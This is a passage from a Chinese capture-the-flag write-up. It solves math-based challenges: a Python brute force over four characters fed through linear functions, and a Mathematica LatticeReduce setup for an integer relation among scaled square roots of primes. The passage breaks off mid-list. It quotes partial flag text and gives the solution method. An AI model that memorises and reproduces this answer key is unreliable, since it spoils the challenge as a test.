  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0084647132090683"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.145449218039294"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"93.360991016406"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.129661397102727"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.122040892629894"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0083962976675733"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.161918669045069"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"116.918194457912"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.059491734827844"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0056849991693217"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0060969842183334"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.0084327591727470"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"236.75106394462"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.36353942139517"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.70488460809345"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.41739635147575"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.34451518373150"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"51.122405489689"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"1.45401653256777"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"1.34247453102010"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.26615676065500"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"3.0139669648705"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> <span class="o">-</span><span class="n">Decimal</span><span class="p">(</span><span class="s">"141.464319575183"</span><span class="p">)</span> <span class="o">+</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"2.2859965487078"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"2.0443726865403"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.33167840124709"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"2.5879619386184"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"162.157812984038"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.76136522113221"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"1.73118866561166"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.20785459756266"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"2.8491946982861"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"340.94773342508"</span><span class="p">)</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.94184265769886"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.63118265229941"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.146383148288089"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"3.4215872464627"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span><span class="p">,</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">:</span> 
 <span class="n">Decimal</span><span class="p">(</span><span class="s">"437.08559091751"</span><span class="p">)</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"3.1661652079608"</span><span class="p">)</span> <span class="o">*</span><span class="n">a</span> <span class="o">-</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"3.4046798398965"</span><span class="p">)</span> <span class="o">*</span><span class="n">b</span> <span class="o">-</span> 
  <span class="n">Decimal</span><span class="p">(</span><span class="s">"0.87263909131944"</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span> <span class="o">+</span> <span class="n">Decimal</span><span class="p">(</span><span class="s">"4.4534924369046"</span><span class="p">)</span> <span class="o">*</span><span class="n">d</span>
<span class="p">]</span>

<span class="kn">import</span> <span class="nn">string</span>

<span class="n">alphabet</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="s">"0123456789"</span> <span class="o">+</span> <span class="s">"_"</span>

<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
    <span class="n">a</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
        <span class="n">b</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
            <span class="n">c</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
                <span class="n">d</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
                <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
                        <span class="n">res</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">round</span><span class="p">(</span><span class="n">i</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">)))))</span>
                        <span class="c1"># if not res[-1].isprintable():
</span>                        <span class="k">if</span> <span class="ow">not</span> <span class="n">res</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
                            <span class="k">raise</span> <span class="nb">ValueError</span>
                    <span class="n">res</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="si">}{</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="si">}{</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="si">}{</span><span class="nb">chr</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="si">}</span><span class="s">"</span>
                    <span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
                <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
                    <span class="k">continue</span>
</code></pre></div></div>

<p>在结果里面翻一下符合英文语法的句子就行。注意别把最后四个字符漏了——一开始我就漏了，结果只看到了 <code class="language-plaintext highlighter-rouge">y0u_are_a_good_gue</code> 这样的单词，我甚至去试了 <code class="language-plaintext highlighter-rouge">y0u_are_a_good_guy</code> 这样的 flag。</p>

<h3 id="flag-3第二阶段">Flag 3（第二阶段）</h3>

<p>看了提示，<a href="https://reference.wolfram.com/language/ref/LatticeReduce.html"><code class="language-plaintext highlighter-rouge">LatticeReduce</code></a>，又看了 Applications，诶可以解整数方程组诶。</p>

<p>我们的问题可以转化为求解 <code class="language-plaintext highlighter-rouge">a0x0+a1x1+...+anxn = 0</code> 的整数解，其中 a1 到 an 为素数的平方根乘以 <code class="language-plaintext highlighter-rouge">10**195</code>，而 a0 为 <code class="language-plaintext highlighter-rouge">25800359843622375482317741765092423108740749704076506674391637220601256480076793833725266596491145653469234638681214279142266384627498702292519864562549230222347690184575651985867669548991937988156542</code>。<code class="language-plaintext highlighter-rouge">LatticeReduce</code> 的输入就是方程组矩阵。把 <code class="language-plaintext highlighter-rouge">a0</code> 设置成 1 然后希望 <code class="language-plaintext highlighter-rouge">LatticeReduce</code> 求出那个特别大的常数好像是不可行的，可能是因为一些数学上的原因。</p>

<p>如果有 19 个字符，那么执行的求解命令就是：</p>

<div class="language-mathematica highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">LatticeReduce</span><span class="p">[{</span><span class="w">
</span><span class="p">{</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a0</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a1</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a2</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a3</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a4</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a5</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a6</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a7</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a8</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a9</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a10</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a11</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a12</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a13</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a14</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a15</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a16</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a17</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">1</span><span class="o">,-</span><span class="nv">a18</span><span class="p">}</span><span class="o">,</span><span class="w">
</span><span class="p">{</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,</span><span class="m">0</span><span class="o">,-</span><span class="nv">a19</span><span class="p">}}]</span><span class="w">
</span></code></pre></div></div>

<p>以此类推，然后生成 Mathematica 代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">25800359843622375482317741765092423108740749704076506674391637220601256480076793833725266596491145653469234638681214279142266384627498702292519864562549230222347690184575651985867669548991937988156542</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">149</span><span class="p">,</span> <span class="mi">151</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">163</span><span class="p">,</span> <span class="mi">167</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">181</span><span class="p">,</span> <span class="mi">191</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">199</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">223</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> <span 